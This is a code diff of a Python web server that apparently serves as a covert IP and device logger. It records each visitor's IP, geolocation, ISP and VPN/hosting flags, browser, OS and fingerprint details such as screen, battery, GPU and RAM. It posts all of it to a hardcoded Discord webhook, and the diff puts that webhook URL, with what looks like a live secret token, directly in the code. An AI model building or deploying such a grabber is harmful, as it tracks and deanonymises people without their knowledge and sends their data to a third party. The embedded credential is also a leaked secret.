@@ -1,21 +1,20 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import datetime
 import urllib.request
-import urllib.parse
 import json
 import os
+import sys
 
-WEBHOOK = os.environ.get('DISCORD_WEBHOOK', 'https://discord.com/api/webhooks/1487460729786470521/PkoLE23Gvw8YUn4XCYLGU69F3aZagIhjyB12VNTDkoknvrVRieCxIVVkjn6T4U9krlvh')
+WEBHOOK = 'https://discord.com/api/webhooks/1487460729786470521/PkoLE23Gvw8YUn4XCYLGU69F3aZagIhjyB12VNTDkoknvrVRieCxIVVkjn6T4U9krlvh'
 
 def send_discord(msg):
-    if not WEBHOOK:
-        return
     try:
         data = json.dumps({"content": msg}).encode()
         req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req, timeout=5)
-    except:
-        pass
+        urllib.request.urlopen(req, timeout=10)
+        print("[+] Discord sent OK", flush=True)
+    except Exception as e:
+        print(f"[!] Discord error: {e}", flush=True)
 
 def get_ip_info(ip):
     try:
@@ -31,25 +30,26 @@ def get_ip_info(ip):
             if data.get('hosting'): flags.append('Hosting')
             if data.get('mobile'):  flags.append('Mobile network')
             return country, city, region, isp, ', '.join(flags) or 'Clean'
-    except:
+    except Exception as e:
+        print(f"[!] IP info error: {e}", flush=True)
         return '?', '?', '?', '?', '?'
 
 def parse_ua(ua):
     ual = ua.lower()
-    if 'android' in ual:         os = 'Android'
-    elif 'iphone' in ual:        os = 'iPhone (iOS)'
-    elif 'ipad' in ual:          os = 'iPad (iOS)'
-    elif 'windows nt 10' in ual: os = 'Windows 10/11'
-    elif 'windows nt 6' in ual:  os = 'Windows 7/8'
-    elif 'mac os' in ual:        os = 'macOS'
-    elif 'linux' in ual:         os = 'Linux'
-    else:                        os = 'Unknown'
-    if 'edg/' in ual:            browser = 'Edge'
-    elif 'opr/' in ual:          browser = 'Opera'
-    elif 'chrome/' in ual:       browser = 'Chrome'
-    elif 'firefox/' in ual:      browser = 'Firefox'
+    if 'android' in ual:           os = 'Android'
+    elif 'iphone' in ual:          os = 'iPhone (iOS)'
+    elif 'ipad' in ual:            os = 'iPad (iOS)'
+    elif 'windows nt 10' in ual:   os = 'Windows 10/11'
+    elif 'windows nt 6' in ual:    os = 'Windows 7/8'
+    elif 'mac os' in ual:          os = 'macOS'
+    elif 'linux' in ual:           os = 'Linux'
+    else:                          os = 'Unknown'
+    if 'edg/' in ual:              browser = 'Edge'
+    elif 'opr/' in ual:            browser = 'Opera'
+    elif 'chrome/' in ual:         browser = 'Chrome'
+    elif 'firefox/' in ual:        browser = 'Firefox'
     elif 'safari/' in ual and 'chrome' not in ual: browser = 'Safari'
-    else:                        browser = 'Unknown'
+    else:                          browser = 'Unknown'
     is_mobile = any(x in ual for x in ['mobile', 'android', 'iphone', 'ipad'])
     return os, browser, 'Phone/Tablet' if is_mobile else 'Desktop/Laptop'
 
@@ -67,27 +67,20 @@ def build_message(ip, ua, extra={}):
     msg += f"OS         : {os}\n"
     msg += f"Browser    : {browser}\n"
     msg += f"Device     : {device}\n"
-    if extra.get('screen'):
-        msg += f"Screen     : {extra.get('screen')}\n"
-    if extra.get('timezone'):
-        msg += f"Timezone   : {extra.get('timezone')}\n"
-    if extra.get('language'):
-        msg += f"Language   : {extra.get('language')}\n"
-    if extra.get('cores'):
-        msg += f"CPU Cores  : {extra.get('cores')}\n"
-    if extra.get('memory'):
-        msg += f"RAM        : {extra.get('memory')} GB\n"
-    if extra.get('battery_level'):
-        msg += f"Battery    : {extra.get('battery_level')} (Charging: {extra.get('battery_charging')})\n"
-    if extra.get('gpu_renderer'):
-        msg += f"GPU        : {extra.get('gpu_renderer')}\n"
-    if extra.get('connection_type'):
-        msg += f"Connection : {extra.get('connection_type')} @ {extra.get('downlink')}\n"
+    if extra.get('screen'):       msg += f"Screen     : {extra.get('screen')}\n"
+    if extra.get('timezone'):     msg += f"Timezone   : {extra.get('timezone')}\n"
+    if extra.get('language'):     msg += f"Language   : {extra.get('language')}\n"
+    if extra.get('cores'):        msg += f"CPU Cores  : {extra.get('cores')}\n"
+    if extra.get('memory'):       msg += f"RAM        : {extra.get('memory')} GB\n"
+    if extra.get('battery_level'): msg += f"Battery    : {extra.get('battery_level')} (Charging: {extra.get('battery_charging')})\n"
+    if extra.get('gpu'):          msg += f"GPU        : {extra.get('gpu')}\n"
+    if extra.get('connection'):   msg += f"Connection : {extra.get('connection')}\n"
     msg += f"```"
     return msg
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
+        print(f"[+] GET {self.path} from {self.client_address[0]}", flush=True)
         if self.path == '/favicon.ico':
             self.send_response(204)
             self.end_headers()
@@ -127,12 +120,13 @@ class Handler(BaseHTTPRequestHandler):
                 ip = self.client_address[0]
                 ua = self.headers.get('User-Agent', 'unknown')
                 send_discord(build_message(ip, ua, extra=data))
-            except:
-                pass
+            except Exception as e:
+                print(f"[!] POST error: {e}", flush=True)
             self.send_response(200)
             self.end_headers()
 
     def log_message(self, format, *args):
         pass
 
+print("[*] Server starting on port 8080", flush=True)
 HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
